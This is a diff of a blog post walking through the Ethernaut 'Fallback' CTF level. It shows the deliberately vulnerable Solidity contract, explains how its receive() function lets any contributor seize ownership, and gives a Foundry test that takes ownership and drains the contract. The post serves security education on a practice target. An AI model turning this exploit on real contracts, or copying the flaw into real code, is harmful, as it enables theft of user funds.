@@ -9,22 +9,22 @@
 
 
 <meta name="author" content="Vasiliy Yorkin">
-<meta name="description" content=" This is a first example of level factory contract:
-// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import &#34;../../game/LevelFactory.sol&#34;; import &#34;./Fallback.sol&#34;; contract FallbackFactory is LevelFactory { function createInstance(address _player) public payable override returns (address) { _player; Fallback instance = new Fallback(); return address(instance); } function validateInstance(address payable _instance, address _player) public override returns (bool) { Fallback instance = Fallback(_instance); return instance.owner() == _player &amp;&amp; address(instance).balance == 0; } } ">
+<meta name="description" content="To complete this level we need become the owner of the contract and reduce its balance to zero.
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.2; import &#34;openzeppelin/utils/math/SafeMath.sol&#34;; contract Fallback { using SafeMath for uint256; mapping(address =&gt; uint256) public contributions; address payable public owner; constructor() { owner = payable(msg.sender); contributions[msg.sender] = 1000 * (1 ether); } modifier onlyOwner() { require(msg.sender == owner, &#34;caller is not the owner&#34;); _; } function contribute() public payable { require(msg.">
 <meta name="keywords" content="Vasiliy Yorkin">
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="CTF walkthrough, Ethernaut, #2 Fallback"/>
-<meta name="twitter:description" content=" This is a first example of level factory contract:
-// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import &#34;../../game/LevelFactory.sol&#34;; import &#34;./Fallback.sol&#34;; contract FallbackFactory is LevelFactory { function createInstance(address _player) public payable override returns (address) { _player; Fallback instance = new Fallback(); return address(instance); } function validateInstance(address payable _instance, address _player) public override returns (bool) { Fallback instance = Fallback(_instance); return instance.owner() == _player &amp;&amp; address(instance).balance == 0; } } "/>
+<meta name="twitter:description" content="To complete this level we need become the owner of the contract and reduce its balance to zero.
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.2; import &#34;openzeppelin/utils/math/SafeMath.sol&#34;; contract Fallback { using SafeMath for uint256; mapping(address =&gt; uint256) public contributions; address payable public owner; constructor() { owner = payable(msg.sender); contributions[msg.sender] = 1000 * (1 ether); } modifier onlyOwner() { require(msg.sender == owner, &#34;caller is not the owner&#34;); _; } function contribute() public payable { require(msg."/>
 
 <meta property="og:title" content="CTF walkthrough, Ethernaut, #2 Fallback" />
-<meta property="og:description" content=" This is a first example of level factory contract:
-// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import &#34;../../game/LevelFactory.sol&#34;; import &#34;./Fallback.sol&#34;; contract FallbackFactory is LevelFactory { function createInstance(address _player) public payable override returns (address) { _player; Fallback instance = new Fallback(); return address(instance); } function validateInstance(address payable _instance, address _player) public override returns (bool) { Fallback instance = Fallback(_instance); return instance.owner() == _player &amp;&amp; address(instance).balance == 0; } } " />
+<meta property="og:description" content="To complete this level we need become the owner of the contract and reduce its balance to zero.
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.2; import &#34;openzeppelin/utils/math/SafeMath.sol&#34;; contract Fallback { using SafeMath for uint256; mapping(address =&gt; uint256) public contributions; address payable public owner; constructor() { owner = payable(msg.sender); contributions[msg.sender] = 1000 * (1 ether); } modifier onlyOwner() { require(msg.sender == owner, &#34;caller is not the owner&#34;); _; } function contribute() public payable { require(msg." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-2-fallback/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-07-22T17:25:00+03:00" />
-<meta property="article:modified_time" content="2022-07-22T17:25:00+03:00" />
+<meta property="article:published_time" content="2022-07-23T23:25:00+03:00" />
+<meta property="article:modified_time" content="2022-07-23T23:25:00+03:00" />
 
 
 
@@ -151,8 +151,8 @@
           <div class="date">
             <span class="posted-on">
               <i class="fa fa-calendar" aria-hidden="true"></i>
-              <time datetime="2022-07-22T17:25:00&#43;03:00">
-                July 22, 2022
+              <time datetime="2022-07-23T23:25:00&#43;03:00">
+                July 23, 2022
               </time>
             </span>
           </div>
@@ -176,30 +176,169 @@
 
       <div>
         
-        <figure><img src="https://vyorkin.org/ox-hugo/ethernaut-fallback-logo.jpg"/>
+        <figure><img src="https://vyorkin.org/ox-hugo/ethernaut-fallback.png"/>
 </figure>
 
-<p>This is a first example of level factory contract:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#888">// SPDX-License-Identifier: UNLICENSED
-</span></span></span><span style="display:flex;"><span><span style="color:#888"></span><span style="color:#080;font-weight:bold">pragma solidity</span> ^<span style="color:#00d;font-weight:bold">0</span>.<span style="color:#00d;font-weight:bold">8</span>.<span style="color:#00d;font-weight:bold">13</span>;
+<p>To complete this level we need become the owner of the contract
+and reduce its balance to zero.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span><span style="color:#080;font-weight:bold">pragma solidity</span> ^<span style="color:#00d;font-weight:bold">0</span>.<span style="color:#00d;font-weight:bold">8</span>.<span style="color:#00d;font-weight:bold">2</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">import</span> <span style="color:#d20;background-color:#fff0f0">&#34;openzeppelin/utils/math/SafeMath.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">contract</span> <span style="color:#b06;font-weight:bold">Fallback</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">using</span> SafeMath <span style="color:#080;font-weight:bold">for</span> <span style="color:#888;font-weight:bold">uint256</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">mapping</span>(<span style="color:#888;font-weight:bold">address</span> =&gt; <span style="color:#888;font-weight:bold">uint256</span>) <span style="color:#080;font-weight:bold">public</span> contributions;
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">address</span> <span style="color:#080;font-weight:bold">payable</span> <span style="color:#080;font-weight:bold">public</span> owner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">constructor</span>() {
+</span></span><span style="display:flex;"><span>        owner = <span style="color:#080;font-weight:bold">payable</span>(<span style="color:#038">msg</span>.<span style="color:#038">sender</span>);
+</span></span><span style="display:flex;"><span>        contributions[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] = <span style="color:#00d;font-weight:bold">1000</span> * (<span style="color:#00d;font-weight:bold">1</span> <span style="color:#080;font-weight:bold">ether</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">modifier</span> <span style="color:#06b;font-weight:bold">onlyOwner</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#038">require</span>(<span style="color:#038">msg</span>.<span style="color:#038">sender</span> == owner, <span style="color:#d20;background-color:#fff0f0">&#34;caller is not the owner&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">_</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">contribute</span>() <span style="color:#080;font-weight:bold">public</span> <span style="color:#080;font-weight:bold">payable</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#038">require</span>(<span style="color:#038">msg</span>.<span style="color:#038">value</span> &lt; <span style="color:#00d;font-weight:bold">0</span>.<span style="color:#00d;font-weight:bold">001</span> <span style="color:#080;font-weight:bold">ether</span>, <span style="color:#d20;background-color:#fff0f0">&#34;msg.value must be &lt; 0.001&#34;</span>);
+</span></span><span style="display:flex;"><span>        contributions[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] += <span style="color:#038">msg</span>.<span style="color:#038">value</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">if</span> (contributions[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] &gt; contributions[owner]) {
+</span></span><span style="display:flex;"><span>            owner = <span style="color:#080;font-weight:bold">payable</span>(<span style="color:#038">msg</span>.<span style="color:#038">sender</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">getContribution</span>() <span style="color:#080;font-weight:bold">public</span> <span style="color:#080;font-weight:bold">view</span> <span style="color:#080;font-weight:bold">returns</span> (<span style="color:#888;font-weight:bold">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">return</span> contributions[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">withdraw</span>() <span style="color:#080;font-weight:bold">public</span> onlyOwner {
+</span></span><span style="display:flex;"><span>        owner.<span style="color:#038">transfer</span>(<span style="color:#888;font-weight:bold">address</span>(<span style="color:#038">this</span>).<span style="color:#038">balance</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    receive() <span style="color:#080;font-weight:bold">external</span> <span style="color:#080;font-weight:bold">payable</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#038">require</span>(<span style="color:#038">msg</span>.<span style="color:#038">value</span> &gt; <span style="color:#00d;font-weight:bold">0</span> &amp;&amp; contributions[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] &gt; <span style="color:#00d;font-weight:bold">0</span>);
+</span></span><span style="display:flex;"><span>        owner = <span style="color:#080;font-weight:bold">payable</span>(<span style="color:#038">msg</span>.<span style="color:#038">sender</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="analysis">
+  Analysis
+  <a class="heading-link" href="#analysis">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>The <code>Fallback</code> contract has the <code>contributions</code> variable of type
+<code>mapping(address =&gt; uint256)</code>. In the constructor it sets the
+<code>owner</code> variable to a deployer (<code>msg.sender</code>) and records that
+the owner donated <code>1000 ether</code>.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">constructor</span>() {
+</span></span><span style="display:flex;"><span>    owner = <span style="color:#080;font-weight:bold">payable</span>(<span style="color:#038">msg</span>.<span style="color:#038">sender</span>);
+</span></span><span style="display:flex;"><span>    contributions[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] = <span style="color:#00d;font-weight:bold">1000</span> * (<span style="color:#00d;font-weight:bold">1</span> <span style="color:#080;font-weight:bold">ether</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This contract has 3 public functions and a single external
+<code>receive</code> function.</p>
+<p><strong>getContribution</strong></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">getContribution</span>() <span style="color:#080;font-weight:bold">public</span> <span style="color:#080;font-weight:bold">view</span> <span style="color:#080;font-weight:bold">returns</span> (<span style="color:#888;font-weight:bold">uint256</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">return</span> contributions[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Nothing interesting, this is just a getter function.</p>
+<p><strong>contribute</strong></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">contribute</span>() <span style="color:#080;font-weight:bold">public</span> <span style="color:#080;font-weight:bold">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#038">require</span>(<span style="color:#038">msg</span>.<span style="color:#038">value</span> &lt; <span style="color:#00d;font-weight:bold">0</span>.<span style="color:#00d;font-weight:bold">001</span> <span style="color:#080;font-weight:bold">ether</span>, <span style="color:#d20;background-color:#fff0f0">&#34;msg.value must be &lt; 0.001&#34;</span>);
+</span></span><span style="display:flex;"><span>    contributions[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] += <span style="color:#038">msg</span>.<span style="color:#038">value</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">if</span> (contributions[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] &gt; contributions[owner]) {
+</span></span><span style="display:flex;"><span>        owner = <span style="color:#080;font-weight:bold">payable</span>(<span style="color:#038">msg</span>.<span style="color:#038">sender</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>After reading it we can tell that:</p>
+<ul>
+<li>To become the owner of this contract we need to contribute
+more ETH than the previous owner</li>
+<li>It is impossible to contribute more than <code>0.001 ETH</code> at once.
+Remember the intial donation of the owner (was set in the
+<code>constructor</code>)? It is <code>1000 ETH</code>.</li>
+</ul>
+<p>So in theory this function is vulnerable, but it will take us a lot
+of time to exploit. Donating <code>1000 ETH</code> means that we need to
+have <code>1000+ ETH</code> on Rinkeby test network and call <code>contribute</code> at
+least <code>1000001</code> times.</p>
+<p><strong>withdraw</strong></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">withdraw</span>() <span style="color:#080;font-weight:bold">public</span> onlyOwner {
+</span></span><span style="display:flex;"><span>    owner.<span style="color:#038">transfer</span>(<span style="color:#888;font-weight:bold">address</span>(<span style="color:#038">this</span>).<span style="color:#038">balance</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This function transfers the contract&rsquo;s balance to the <code>owner</code>.
+Notice that the <code>Fallback</code> contract has the <code>onlyOwner</code> modifier
+which restricts withdrawals to the <code>owner</code>.</p>
+<p><strong>receive</strong></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>receive() <span style="color:#080;font-weight:bold">external</span> <span style="color:#080;font-weight:bold">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#038">require</span>(<span style="color:#038">msg</span>.<span style="color:#038">value</span> &gt; <span style="color:#00d;font-weight:bold">0</span> &amp;&amp; contributions[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] &gt; <span style="color:#00d;font-weight:bold">0</span>);
+</span></span><span style="display:flex;"><span>    owner = <span style="color:#080;font-weight:bold">payable</span>(<span style="color:#038">msg</span>.<span style="color:#038">sender</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This is another function that sets the contract <code>owner</code> but this
+one is special. The <code>receive</code> function is used, well, to receive
+ETH (when <code>msg.data</code> is empty). It is executed on a call to the
+contract with empty calldata (<code>msg.data</code>). Remember the diagram
+from the
+<a href="https://solidity-by-example.org/sending-ether/">solidity-by-example</a>?</p>
+<div class="mermaid">
+%%{init: {'theme':'neutral'}}%%
+flowchart LR
+    A[send ETH] --&gt; B{"msg.data is empty?"}
+    B -- yes --&gt; C{"receive() exists?"}
+    C -- yes --&gt; E["receive()"]
+    C -- no --&gt; F["fallback()"]
+    B -- no --&gt; D["fallback()"]
+
+</div>
+
+
+<p>Reference:
+<a href="https://docs.soliditylang.org/en/v0.8.12/contracts.html#receive-ether-function">solidity
+docs</a></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#038">require</span>(<span style="color:#038">msg</span>.<span style="color:#038">value</span> &gt; <span style="color:#00d;font-weight:bold">0</span> &amp;&amp; contributions[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] &gt; <span style="color:#00d;font-weight:bold">0</span>);
+</span></span><span style="display:flex;"><span>owner = <span style="color:#080;font-weight:bold">payable</span>(<span style="color:#038">msg</span>.<span style="color:#038">sender</span>);
+</span></span></code></pre></div><p>The <code>receive</code> function is vulnerable 😈 but to set the <code>owner</code>
+we need to contribute something first.</p>
+<p>We can come up with the following exploit scenario:</p>
+<ol>
+<li>Call <code>contribute</code> sending at least <code>0.001 ether</code></li>
+<li>Send to the <code>Fallback</code> contract at least <code>1 wei</code> to call the
+<code>receive</code> function and change the <code>owner</code></li>
+<li>Call <code>withdraw</code> and steal the funds</li>
+</ol>
+<h2 id="framework">
+  Framework
+  <a class="heading-link" href="#framework">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>In <a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-1-hello">the previous
+post</a> I&rsquo;ve said that I&rsquo;ll copy and adapt levels and their
+factories from the
+<a href="https://github.com/OpenZeppelin/ethernaut/tree/master/contracts/contracts/levels">ethernaut
+repository</a> one by one as we progress. Let&rsquo;s do that. This is a
+first example of level factory contract:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span><span style="color:#080;font-weight:bold">pragma solidity</span> ^<span style="color:#00d;font-weight:bold">0</span>.<span style="color:#00d;font-weight:bold">8</span>.<span style="color:#00d;font-weight:bold">2</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">import</span> <span style="color:#d20;background-color:#fff0f0">&#34;../../game/LevelFactory.sol&#34;</span>;
 </span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">import</span> <span style="color:#d20;background-color:#fff0f0">&#34;./Fallback.sol&#34;</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">contract</span> <span style="color:#b06;font-weight:bold">FallbackFactory</span> <span style="color:#080;font-weight:bold">is</span> LevelFactory {
-</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">createInstance</span>(<span style="color:#888;font-weight:bold">address</span> _player)
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">createInstance</span>(<span style="color:#888;font-weight:bold">address</span>)
 </span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">public</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">payable</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">override</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">returns</span> (<span style="color:#888;font-weight:bold">address</span>)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        _player;
 </span></span><span style="display:flex;"><span>        Fallback instance = <span style="color:#080;font-weight:bold">new</span> Fallback();
 </span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">return</span> <span style="color:#888;font-weight:bold">address</span>(instance);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">validateInstance</span>(<span style="color:#888;font-weight:bold">address</span> <span style="color:#080;font-weight:bold">payable</span> _instance, <span style="color:#888;font-weight:bold">address</span> _player)
 </span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">public</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">view</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">override</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">returns</span> (<span style="color:#888;font-weight:bold">bool</span>)
 </span></span><span style="display:flex;"><span>    {
@@ -207,7 +346,77 @@
 </span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">return</span> instance.owner() == _player &amp;&amp; <span style="color:#888;font-weight:bold">address</span>(instance).<span style="color:#038">balance</span> == <span style="color:#00d;font-weight:bold">0</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div>
+</span></span></code></pre></div><p>It is very similar to the
+<a href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/FallbackFactory.sol">one
+in the Ethernaut repo</a>. I just changed imports, Solidity versio
+and removed the <code>_player</code> argument name.</p>
+<h2 id="exploit">
+  Exploit
+  <a class="heading-link" href="#exploit">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span><span style="color:#080;font-weight:bold">pragma solidity</span> ^<span style="color:#00d;font-weight:bold">0</span>.<span style="color:#00d;font-weight:bold">8</span>.<span style="color:#00d;font-weight:bold">2</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">import</span> {Ethernaut} <span style="color:#080;font-weight:bold">from</span> <span style="color:#d20;background-color:#fff0f0">&#34;../game/Ethernaut.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">import</span> {Fallback} <span style="color:#080;font-weight:bold">from</span> <span style="color:#d20;background-color:#fff0f0">&#34;../levels/Fallback/Fallback.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">import</span> {FallbackFactory} <span style="color:#080;font-weight:bold">from</span> <span style="color:#d20;background-color:#fff0f0">&#34;../levels/Fallback/FallbackFactory.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">import</span> {LevelTest} <span style="color:#080;font-weight:bold">from</span> <span style="color:#d20;background-color:#fff0f0">&#34;./common/LevelTest.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">contract</span> <span style="color:#b06;font-weight:bold">FallbackTest</span> <span style="color:#080;font-weight:bold">is</span> LevelTest {
+</span></span><span style="display:flex;"><span>  Fallback <span style="color:#080;font-weight:bold">private</span> level;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#080;font-weight:bold">constructor</span>() {
+</span></span><span style="display:flex;"><span>    levelFactory = <span style="color:#080;font-weight:bold">new</span> FallbackFactory();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">testFallback</span>() <span style="color:#080;font-weight:bold">public</span> {
+</span></span><span style="display:flex;"><span>    run();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">init</span>() <span style="color:#080;font-weight:bold">internal</span> <span style="color:#080;font-weight:bold">override</span> {
+</span></span><span style="display:flex;"><span>    levelAddress = <span style="color:#080;font-weight:bold">payable</span>(<span style="color:#038">this</span>.create());
+</span></span><span style="display:flex;"><span>    level = Fallback(levelAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    assertEq(level.owner(), <span style="color:#888;font-weight:bold">address</span>(levelFactory));
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">exploit</span>() <span style="color:#080;font-weight:bold">internal</span> <span style="color:#080;font-weight:bold">override</span> {
+</span></span><span style="display:flex;"><span>    vm.startPrank(player);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    level.contribute{<span style="color:#038">value</span>: <span style="color:#00d;font-weight:bold">0</span>.<span style="color:#00d;font-weight:bold">0009</span> <span style="color:#080;font-weight:bold">ether</span>}();
+</span></span><span style="display:flex;"><span>    (<span style="color:#888;font-weight:bold">bool</span> sent,) = levelAddress.<span style="color:#038">call</span>{<span style="color:#038">value</span>: <span style="color:#00d;font-weight:bold">1</span>}(<span style="color:#d20;background-color:#fff0f0">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#038">require</span>(sent, <span style="color:#d20;background-color:#fff0f0">&#34;Failed to send 1 wei to Fallback contract&#34;</span>);
+</span></span><span style="display:flex;"><span>    level.withdraw();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    vm.stopPrank();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Let&rsquo;s walk trought the <code>exploit</code> function:</p>
+<ul>
+<li>A contribution must be less than <code>0.001 ether</code>, so we donate <code>0.0009 ETH</code>.</li>
+<li>Now to call the <code>receive</code> function and to pass the <code>require</code>
+precondition we need to sent some ETH. Let&rsquo;s sent just <code>1 wei</code>.</li>
+<li>Finally we call the <code>withdraw</code> function to drain contract&rsquo;s balance.</li>
+</ul>
+<h2 id="lessons-learned">
+  Lessons learned
+  <a class="heading-link" href="#lessons-learned">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>Anyone can call the <code>receive</code> (or <code>fallback</code>) function so be
+careful :P</p>
+<p>Thank you for reading and let&rsquo;s move on to the next challenge:
+<a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-3-fallout">CTF walkthrough,
+Ethernaut, #3 Fallout</a>!</p>
+
+        
+        <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+        <script>
+            mermaid.initialize({ startOnLoad: true });
+        </script>
         
       </div>
 
